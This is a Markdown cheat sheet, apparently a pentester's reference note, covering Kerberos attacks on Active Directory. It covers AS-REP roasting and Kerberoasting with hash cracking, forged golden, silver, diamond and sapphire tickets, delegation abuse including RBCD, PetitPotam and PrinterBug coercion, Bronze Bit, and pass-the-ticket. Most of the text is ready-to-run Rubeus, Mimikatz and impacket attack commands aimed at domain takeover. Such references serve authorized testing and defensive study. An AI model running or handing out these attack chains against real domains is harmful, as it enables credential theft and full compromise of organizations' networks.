---
title: "Active Directory Kerberos Attacks Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - kerberos
  - roasting
  - delegation
  - tickets
---

# Active Directory Kerberos Attacks Reference

Comprehensive reference for Kerberos-based attacks including roasting, ticket attacks, delegation abuse, and related CVEs. See also: [[AD-Credential-Attacks]], [[AD-CVE-Reference]], [[AD-Enumeration-Reference]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#AS-REP Roasting]]
- [[#Kerberoasting]]
- [[#Ticket Attacks]]
- [[#Golden Ticket]]
- [[#Silver Ticket]]
- [[#Diamond & Sapphire Tickets]]
- [[#Unconstrained Delegation]]
- [[#Constrained Delegation]]
- [[#Resource-Based Constrained Delegation (RBCD)]]
- [[#Bronze Bit (CVE-2020-17049)]]
- [[#S4U2Self Privilege Escalation]]
- [[#Pass-the-Ticket]]

---

## AS-REP Roasting

Targets accounts with **"Do not require Kerberos preauthentication"** (UF_DONT_REQUIRE_PREAUTH) enabled. The KDC returns an AS-REP encrypted with the user's password hash, which can be cracked offline.

### Enumeration

```powershell
# PowerView
Get-NetUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

### Exploitation

```bash
# impacket GetNPUsers
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
impacket-GetNPUsers corp.local/jdoe:password -request -format hashcat -dc-ip <DC_IP>

# netexec
netexec ldap <DC_IP> -u jdoe -p password --asreproast asrep.txt
netexec ldap <DC_IP> -u '' -p '' --asreproast asrep.txt  # if null bind allowed
```

```powershell
# Rubeus
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
.\Rubeus.exe asreproast /user:victim /format:hashcat
.\Rubeus.exe asreproast /domain:corp.local /dc:<DC_IP> /format:hashcat
```

### Cracking

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### CVE-2022-33679

Allows AS-REP roasting on users that have preauth enabled, by requesting RC4 encryption downgrade.

```bash
python3 CVE-2022-33679.py corp.local/jdoe <DC_IP>
```

---

## Kerberoasting

Requests TGS tickets for service accounts (accounts with SPNs). Tickets are encrypted with the service account's NTLM hash and can be cracked offline.

### Enumeration

```powershell
# PowerView - find Kerberoastable users
Get-NetUser -SPN
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Exploitation

```bash
# impacket GetUserSPNs
impacket-GetUserSPNs corp.local/jdoe:password -dc-ip <DC_IP> -outputfile kerberoast.txt
impacket-GetUserSPNs corp.local/jdoe:password -dc-ip <DC_IP> -request

# netexec
netexec ldap <DC_IP> -u jdoe -p password --kerberoasting kerberoast.txt
```

```powershell
# Rubeus
.\Rubeus.exe kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:svcaccount /format:hashcat
.\Rubeus.exe kerberoast /rc4opsec    # Only RC4 (faster to crack)
.\Rubeus.exe kerberoast /aes256opsec # Prefer AES256 (stealthier)

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

### Cracking

```bash
# RC4 / Type 23 (most common)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES128 / Type 19600
hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt

# AES256 / Type 19700
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

## Ticket Attacks

### Dumping Tickets

```powershell
# Mimikatz - dump all tickets
sekurlsa::tickets /export
sekurlsa::tickets

# Rubeus - dump tickets
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /user:administrator /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap
.\Rubeus.exe triage    # List tickets

# PowerShell
klist                  # List current tickets
```

```bash
# Linux - list ccache
klist
klist -c /tmp/krb5cc_1000
```

### Importing / Replaying Tickets

```powershell
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:<base64>
```

```bash
# Linux - set environment variable
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

### Converting Between Formats

```bash
# .kirbi to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## Golden Ticket

Forge a TGT using the **krbtgt** account's NTLM hash. Valid for any user, any group, any service.

**Requirements:** krbtgt hash (obtained via DCSync or NTDS dump)

### Creating Golden Ticket

```bash
# Get domain SID
impacket-getPac -targetUser administrator corp.local/jdoe:password

# impacket ticketer
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

```powershell
# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt  # Get krbtgt hash first

kerberos::golden /user:administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ticket:golden.kirbi
kerberos::ptt golden.kirbi

# With extra groups (for cross-domain)
kerberos::golden /user:administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /groups:512,518,519,520 /ticket:golden.kirbi
```

```powershell
# Rubeus
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:corp.local /sid:<DOMAIN_SID> /user:administrator /ptt
.\Rubeus.exe golden /aes256:<AES256_HASH> /domain:corp.local /sid:<DOMAIN_SID> /user:administrator /ptt
```

```python
# Meterpreter
load kiwi
golden_ticket_create -d corp.local -k <KRBTGT_HASH> -s <DOMAIN_SID> -u administrator -t /tmp/golden.kirbi
kerberos_ticket_use /tmp/golden.kirbi
```

---

## Silver Ticket

Forge a TGS for a specific service using the **service account's** NTLM hash. More targeted, harder to detect.

**Requirements:** Service account hash, target service SPN

### Service SPNs

| Service | SPN | Access |
|---------|-----|--------|
| CIFS | CIFS/server.corp.local | File shares |
| HOST | HOST/server.corp.local | PSExec/Scheduled Tasks |
| HTTP | HTTP/server.corp.local | Web services |
| LDAP | LDAP/dc01.corp.local | LDAP queries |
| MSSQL | MSSQLSvc/sql01.corp.local:1433 | SQL Server |
| WSMAN | WSMAN/server.corp.local | WinRM/PowerShell Remoting |
| RPCSS | RPCSS/server.corp.local | WMI |
| GC | GC/dc01.corp.local | Global Catalog |

### Creating Silver Ticket

```bash
# impacket ticketer
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.local -spn cifs/server.corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@server.corp.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:<DOMAIN_SID> /target:server.corp.local /service:cifs /rc4:<SERVICE_HASH> /ticket:silver.kirbi
kerberos::ptt silver.kirbi
```

---

## Diamond & Sapphire Tickets

More stealthy alternatives to Golden/Silver tickets.

### Diamond Ticket

Modifies a legitimate TGT by decrypting and re-encrypting with the krbtgt key. Less detectable since a real TGT is modified rather than forged.

```powershell
# Rubeus
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:jdoe /password:password /enctype:aes /ticketuser:administrator /ptt
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /tgtdeleg /enctype:aes /ticketuser:administrator /ptt
```

### Sapphire Ticket

Obtains a legitimate PAC from a privileged user and embeds it into a forged ticket. Uses S4U2self+U2U.

```bash
# impacket (requires DC access)
impacket-ticketer -request -impersonate administrator -nthash <KRBTGT_HASH> -aesKey <AES256_KEY> -domain corp.local -domain-sid <SID> administrator
```

---

## Unconstrained Delegation

When a service account has unconstrained delegation, it receives the user's TGT when they authenticate to it. If we compromise such an account, we can steal TGTs.

### Finding Accounts with Unconstrained Delegation

```powershell
# PowerView
Get-NetComputer -Unconstrained
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained   # User accounts (rare)

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

### Exploitation - SpoolSample (PrinterBug)

```bash
# Step 1: Start Rubeus monitor on the delegated computer
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Trigger DC to authenticate to compromised host (run from attacker or any host)
python3 printerbug.py corp.local/jdoe:password@<DC_IP> <UNCONSTRAINED_HOST>
# OR
.\SpoolSample.exe <DC_IP> <UNCONSTRAINED_HOST>

# Step 3: Rubeus captures DC TGT
# Step 4: Pass the ticket and DCSync
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

### Exploitation - PetitPotam (MS-EFSRPC)

```bash
# Step 1: Monitor for tickets
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Trigger authentication via MS-EFSRPC
python3 PetitPotam.py <UNCONSTRAINED_HOST_IP> <DC_IP>

# Step 3: DC$ TGT captured - use for DCSync
.\Rubeus.exe ptt /ticket:<dc_tgt>
```

---

## Constrained Delegation

Service accounts with constrained delegation can request TGS tickets for users to access a specific set of services (using S4U2proxy). Also exploitable via S4U2self.

### Finding Accounts with Constrained Delegation

```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo
```

```cypher
# BloodHound query
MATCH (u:User {hasspn: true})-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
```

### Exploitation

```bash
# impacket getST (S4U2self + S4U2proxy)
impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/svc_account:password
export KRB5CCNAME=administrator@cifs_target.corp.local.ccache
impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
```

```powershell
# Rubeus S4U
.\Rubeus.exe s4u /user:svc_account /rc4:<HASH> /impersonateuser:administrator /msdsspn:"cifs/target.corp.local" /ptt
.\Rubeus.exe s4u /user:svc_account /aes256:<AES_KEY> /impersonateuser:administrator /msdsspn:"cifs/target.corp.local" /altservice:krbtgt /ptt
```

---

## Resource-Based Constrained Delegation (RBCD)

The **target resource** controls which accounts can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you have GenericWrite/WriteDACL on the target computer, you can configure delegation.

### Requirements

- Write permissions on target computer object (GenericAll, GenericWrite, WriteDACL, WriteOwner)
- A controlled computer/user account with SPN (or ability to create one)

### Full Attack Chain

```powershell
# Step 1: Create a new computer account (default: any auth user can create up to 10)
Import-Module Powermad
New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force) -Verbose

# Step 2: Configure RBCD - target delegates to FakeComputer
Import-Module PowerView
$FakeComputerSID = Get-DomainComputer FakeComputer | Select -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($FakeComputerSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Write the attribute to target computer
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Step 3: Get TGT for FakeComputer
.\Rubeus.exe hash /password:FakePass123! /user:FakeComputer$ /domain:corp.local

# Step 4: S4U2self + S4U2proxy
.\Rubeus.exe s4u /user:FakeComputer$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:"cifs/TARGET.corp.local" /ptt
```

```bash
# Alternative - bloodyAD
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p password add rbcd TARGET FakeComputer

# impacket getST
impacket-getST -spn cifs/TARGET.corp.local -impersonate administrator corp.local/FakeComputer$:FakePass123!
```

### Cleanup

```powershell
# Remove msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer TARGET | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

---

## Bronze Bit (CVE-2020-17049)

Bypass Kerberos delegation restrictions by forging the `Forwardable` flag in service tickets.

**Requirements:** Service account hash with constrained delegation configured

```bash
# impacket getST with -force-forwardable
impacket-getST -force-forwardable -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_account:password

export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local
```

---

## S4U2Self Privilege Escalation

S4U2Self allows a service to obtain a service ticket to itself on behalf of another user. If the service account has `TrustedToAuthForDelegation` set, the resulting ticket is forwardable.

```bash
# impacket
impacket-getST -self -impersonate administrator corp.local/svc_account:password -dc-ip <DC_IP>
```

```powershell
# Rubeus
.\Rubeus.exe s4u /self /user:svc_account /rc4:<HASH> /impersonateuser:administrator /ptt
```

---

## Pass-the-Ticket

See [[AD-Credential-Attacks]] for full Pass-the-Hash/Key/Ticket details.

```powershell
# Rubeus - inject ticket into current session
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:<base64>

# Rubeus - create sacrificial logon session
.\Rubeus.exe createnetonly /program:cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:<LUID>

# Mimikatz
kerberos::ptt ticket.kirbi
```

```bash
# Linux
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01
impacket-wmiexec -k -no-pass corp.local/administrator@dc01
impacket-smbclient -k -no-pass corp.local/administrator@dc01
```
